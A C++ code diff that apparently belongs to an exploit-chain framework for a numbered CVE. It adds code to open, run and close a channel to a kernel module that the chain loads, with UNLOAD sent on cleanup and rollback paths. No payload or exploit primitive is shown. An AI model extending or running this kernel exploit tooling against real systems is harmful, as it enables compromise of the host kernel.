@@ -282,6 +282,13 @@ namespace {
         if (ops.restore_hook != nullptr) {
             result.hook_restored = ops.restore_hook(ops.write.ctx);
         }
+        /* Close the LKM residency window before release drops the device
+         * context: the close callback sends UNLOAD, so a failure/rollback path
+         * never leaves the module resident. Opened-once / closed-once. */
+        if (workspace.lkm_window_open && ops.close_lkm_channel != nullptr) {
+            ops.close_lkm_channel(ops.write.ctx);
+            result.lkm_channel_closed = true;
+        }
         if (ops.release != nullptr) {
             ops.release(ops.write.ctx);
             result.cleanup_ran = true;
@@ -482,6 +489,25 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         result.wait = ops.wait_result(ops.write.ctx, request.wait_timeout_ms);
         if (result.wait == ChainWaitOutcome::LkmLoaded) {
             result.lkm_loaded = true;
+            /* The LKM is resident now, so this is the only place the versioned
+             * channel may be opened: after LkmLoaded and before the terminus.
+             * finish() guarantees the matching close (UNLOAD) on every path. */
+            if (ops.open_lkm_channel != nullptr) {
+                if (!ops.open_lkm_channel(ops.write.ctx)) {
+                    /* Countermeasure facility, not an attack step: an unusable
+                     * kernel channel is recorded and the chain continues
+                     * (countermeasures fail soft, §3.8/§3.13). Plugins that
+                     * needed it observe Unsupported. */
+                    result.lkm_window_failed = true;
+                } else {
+                    workspace.lkm_window_open = true;
+                    result.lkm_channel_opened = true;
+                    if (ops.run_lkm_window != nullptr &&
+                        !ops.run_lkm_window(ops.write.ctx)) {
+                        result.lkm_window_failed = true;
+                    }
+                }
+            }
         } else if (result.wait == ChainWaitOutcome::Failed) {
             result.error = ChainError::LkmFailed;
         } else {
